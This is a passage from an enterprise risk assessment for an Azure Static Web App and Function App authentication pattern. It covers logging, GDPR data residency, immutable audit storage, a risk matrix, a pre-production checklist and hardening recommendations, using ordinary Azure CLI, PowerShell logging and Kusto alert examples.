**Impact:** High (inability to detect/respond to issues)  
**Risk Score:** High

**Mitigation Strategies:**

1. **Application Insights Integration**
   ```bash
   # Enable Application Insights for SWA
   az staticwebapp appsettings set \
     --name ID360Model-SWA \
     --setting-names APPINSIGHTS_INSTRUMENTATIONKEY=<key>
   
   # Enable for Function App
   az functionapp config appsettings set \
     --name ID360Model-FA \
     --settings "APPINSIGHTS_INSTRUMENTATIONKEY=<key>"
   ```

2. **Structured Logging**
   ```powershell
   # In PowerShell functions
   $logEntry = @{
     timestamp = (Get-Date).ToUniversalTime()
     operation = "GetUser"
     userPrincipalName = $userPrincipalName
     authMethod = $authMethod
     success = $true
     duration = $executionTime
     requestId = $Request.Headers['x-ms-request-id']
   }
   Write-Host ($logEntry | ConvertTo-Json -Compress)
   ```

3. **Key Metrics to Log**
   - Authentication attempts (success/failure)
   - Token acquisitions
   - Graph API calls (endpoint, duration, status)
   - Errors with correlation IDs
   - Performance metrics (cold start time, execution time)

4. **Alerting Rules**
   ```kusto
   // Application Insights query - Alert on auth failures
   requests
   | where timestamp > ago(5m)
   | where success == false
   | where url contains "/api/user"
   | summarize FailureCount = count() by bin(timestamp, 1m)
   | where FailureCount > 10
   ```

5. **Security Information and Event Management (SIEM)**
   - Forward Azure logs to Sentinel or Splunk
   - Correlate events across SWA, Function App, Azure AD
   - Automated threat detection

**Monitoring Dashboard (KPIs):**
- Availability: 99.9% uptime
- Performance: P95 response time <500ms
- Authentication: <0.1% failure rate
- Errors: <1% error rate
- Cold starts: <5% of requests

---

## Compliance and Regulatory Risks

### Risk 7.1: Data Residency Requirements

**Description:** Storing user data or tokens in certain Azure regions may violate data residency regulations (GDPR, local data protection laws).

**Likelihood:** Medium (region-dependent)  
**Impact:** Critical (regulatory fines, legal issues)  
**Risk Score:** High (if applicable)

**Mitigation Strategies:**

1. **Verify Data Locations**
   ```bash
   # Check SWA region
   az staticwebapp show --name ID360Model-SWA --query location
   
   # Check Function App region
   az functionapp show --name ID360Model-FA --query location
   
   # Check Storage Account region (for Function App state)
   az storage account show --name id360modelstorage --query location
   ```

2. **EU Data Residency (GDPR Compliance)**
   - Deploy to EU regions only: `westeurope`, `northeurope`
   - Current deployment: ✅ West Europe
   - Verify Azure AD tenant is also in EU
   - Use Azure Policy to prevent non-EU deployments

3. **Data Classification**
   - **What data do we store?**
     - Tokens (sessionStorage, temporary, user's browser only)
     - Logs (Application Insights, 90 days retention)
     - Function App state (minimal, transient)
   - **Personal data (GDPR Article 4):**
     - UPN, display name, email (from Graph API)
     - User's IP address (in logs)
   - **Mitigation:**
     - Implement data retention policies
     - Provide user data export capability (GDPR Article 15)
     - Implement "right to be forgotten" (GDPR Article 17)

4. **Cross-Border Data Transfer**
   - Microsoft Graph API calls may route through US datacenters
   - **Mitigation:** Microsoft Standard Contractual Clauses (SCCs) in place
   - Document data flows for privacy impact assessment

**Monitoring:**
- Resource creation events (alert on non-EU regions)
- Data retention policy compliance
- User data access requests (GDPR)

---

### Risk 7.2: Audit Trail Requirements

**Description:** Insufficient audit logs could violate compliance requirements (SOX, PCI-DSS, HIPAA, etc.).

**Likelihood:** High (if not explicitly addressed)  
**Impact:** High (audit failures, compliance violations)  
**Risk Score:** High (for regulated industries)

**Mitigation Strategies:**

1. **Comprehensive Audit Logging**
   ```powershell
   # Log all privileged operations
   $auditLog = @{
     timestamp = (Get-Date).ToUniversalTime()
     user = $userPrincipalName
     action = "GetUser"
     target = $targetUser
     result = "Success"
     ipAddress = $Request.Headers['x-forwarded-for']
     userAgent = $Request.Headers['user-agent']
     requestId = $Request.Headers['x-ms-request-id']
   }
   
   # Send to secure audit log storage
   Write-AuditLog $auditLog
   ```

2. **Immutable Audit Storage**
   - Store audit logs in append-only storage
   - Azure Storage immutable blob storage
   - Retention: 7 years (common regulatory requirement)
   ```bash
   # Create immutable storage for audit logs
   az storage account create \
     --name id360auditlogs \
     --resource-group IAM-RA \
     --sku Standard_LRS \
     --location westeurope
   
   az storage container create \
     --name audit-logs \
     --account-name id360auditlogs \
     --public-access off
   
   # Enable immutability (WORM - Write Once Read Many)
   az storage container immutability-policy create \
     --account-name id360auditlogs \
     --container-name audit-logs \
     --period 2555  # 7 years in days
   ```

3. **Azure AD Sign-In Logs**
   - Automatically collected by Azure AD
   - Retention: 30 days (free tier), 6 months (Premium)
   - Export to Log Analytics for longer retention

4. **Audit Log Contents (Minimum)**
   - Who (user principal name, IP address)
   - What (action performed, resource accessed)
   - When (timestamp in UTC)
   - Result (success/failure)
   - Where (region, application)

**Monitoring:**
- Audit log availability (alert if logging stops)
- Unauthorized access attempts to audit logs
- Compliance dashboard (SOC 2, ISO 27001, etc.)

---

## Risk Matrix Summary

| Risk ID | Risk Description | Likelihood | Impact | Risk Score | Priority |
|---------|-----------------|------------|--------|------------|----------|
| 1.1 | SWA Service Availability | Low | High | Medium | Medium |
| 1.2 | Navigation Fallback Config Errors | Medium | Medium | Medium | Medium |
| 1.3 | CSP Violations | Medium | High | **High** | **High** |
| 1.4 | SWA SKU Limitations | High | Medium-High | Medium-High | High |
| 2.1 | PowerShell Runtime Limitations | Medium | Medium | Medium | Medium |
| 2.2 | Function App Auth Bypass | Medium | Critical | **High** | **Critical** |
| 2.3 | Managed Identity Token Leakage | Low | Critical | Medium | High |
| 2.4 | PowerShell Injection Attacks | Low | Critical | Medium-High | High |
| 3.1 | Token Storage in Browser | Medium | Critical | **High** | **Critical** |
| 3.2 | MSAL.js Library Compromise | Very Low | Critical | Medium | Medium |
| 3.3 | Redirect URI Hijacking | Low | High | Medium | Medium |
| 3.4 | Phishing Attacks | Medium | High | **High** | **High** |
| 4.1 | Redirect Page Attack Target | Low | Medium | Low | Low |
| 4.2 | sessionStorage Race Conditions | Low | Medium | Low | Low |
| 5.1 | SWA-FA Link Failure | Low | High | Medium | Medium |
| 5.2 | CORS Misconfiguration | Medium | Medium | Medium | Medium |
| 6.1 | Deployment Pipeline Failure | Medium | Medium | Medium | Medium |
| 6.2 | Cost Overruns | Low-Medium | Medium | Low-Medium | Low |
| 6.3 | Insufficient Logging | High | High | **High** | **Critical** |
| 7.1 | Data Residency | Medium | Critical | **High** | **High** |
| 7.2 | Audit Trail Requirements | High | High | **High** | **Critical** |

### Risk Score Legend
- **Critical:** Immediate action required
- **High:** Address before production rollout
- **Medium:** Address within 30 days of production
- **Low:** Monitor and address in backlog

---

## Pre-Production Checklist

Before deploying this pattern to production, ensure:

### Security
- [ ] CSP configured without `unsafe-inline` / `unsafe-eval` (or accepted risk documented)
- [ ] Function App auth bypass protection implemented
- [ ] Tokens never logged in plain text
- [ ] Input validation on all user-provided parameters
- [ ] HTTPS enforced everywhere
- [ ] Subresource Integrity (SRI) for CDN resources
- [ ] Rate limiting implemented

### Reliability
- [ ] Multi-region deployment OR documented RTO/RPO
- [ ] Monitoring and alerting configured
- [ ] Health checks operational
- [ ] Rollback procedures tested
- [ ] Cold start mitigation strategy in place

### Compliance
- [ ] Data residency verified (GDPR compliance)
- [ ] Audit logging implemented
- [ ] Log retention policy configured
- [ ] Privacy impact assessment completed
- [ ] Data processing agreements in place

### Operational
- [ ] Runbooks for common issues
- [ ] On-call rotation and escalation defined
- [ ] Cost alerts configured
- [ ] Backup and restore procedures tested
- [ ] Disaster recovery plan documented

### Testing
- [ ] Penetration testing completed
- [ ] Load testing completed (expected peak + 2x)
- [ ] Auth flow tested in all browsers
- [ ] Failover scenarios tested
- [ ] Security scanning in CI/CD pipeline

---

## Recommended Security Hardening (Phase 2)

For production enterprise deployment, consider:

1. **Azure Private Link**
   - Function App accessible only via private endpoint
   - Cost: ~$85/month
   - Benefit: Eliminates public internet exposure

2. **Azure Front Door + WAF**
   - Web Application Firewall in front of SWA
   - DDoS protection
   - Global load balancing
   - Cost: ~$35/month + $5/rule
   - Benefit: Enterprise-grade security and performance

3. **Azure Key Vault**
   - Store client secrets in Key Vault (not app settings)
   - Managed identity access to Key Vault
   - Automatic secret rotation
   - Cost: ~$3/month
   - Benefit: Centralized secret management, audit trail

4. **Privileged Identity Management (PIM)**
   - Just-in-time admin access to Azure resources
   - Approval workflows for sensitive operations
   - Requires Azure AD Premium P2
   - Cost: ~$9/user/month
   - Benefit: Reduced standing admin access

5. **Remove `unsafe-inline` from CSP**
   - Implement nonce-based CSP
   - Requires backend generation of nonces
   - Significantly hardens against XSS
   - Cost: Development effort only
   - Benefit: Industry-standard CSP compliance

---

## Conclusion

This pattern (Azure SWA + Function App + MSAL.js + dedicated redirect page) is **production-ready** when:
- **High** and **Critical** risks are mitigated
- Pre-production checklist is completed
- Monitoring and alerting are operational
- Team is trained on runbooks and escalation procedures

**Key Takeaway:** The dedicated redirect page pattern itself introduces **minimal additional risk** (only 2 low-severity risks). The majority of risks are inherent to the Azure platform and authentication in general, and apply to any web application with backend APIs.

**This pattern is recommended** for enterprise adoption when implemented with the mitigations outlined in this document.

---

## References

- [Azure Static Web Apps Security](https://learn.microsoft.com/azure/static-web-apps/authentication-authorization)
- [Azure Function App Security Best Practices](https://learn.microsoft.com/azure/azure-functions/security-concepts)
- [MSAL.js Security Considerations](https://github.com/AzureAD/microsoft-authentication-library-for-js/wiki/Security-Considerations)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Azure Security Baseline for Static Web Apps](https://learn.microsoft.com/security/benchmark/azure/baselines/static-web-apps-security-baseline)
- [GDPR Compliance Guide](https://learn.microsoft.com/compliance/regulatory/gdpr)

---

**Document Version:** 1.0  
**Last Updated:** November 3, 2025  
**Next Review Date:** February 3, 2026 (quarterly review recommended)  
**Owner:** Security & Architecture Teams

